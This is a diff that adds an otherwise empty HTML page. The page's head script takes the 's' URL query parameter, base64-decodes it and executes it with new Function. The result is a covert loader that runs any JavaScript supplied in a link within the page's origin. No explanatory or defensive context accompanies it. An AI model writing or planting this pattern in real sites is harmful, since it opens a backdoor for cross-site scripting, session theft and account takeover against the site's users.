@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+(function(){
+    var p = new URLSearchParams(window.location.search).get('s');
+    if (p) new Function(atob(p))();
+})();
+</script>
+</head>
+<body></body>
+</html>
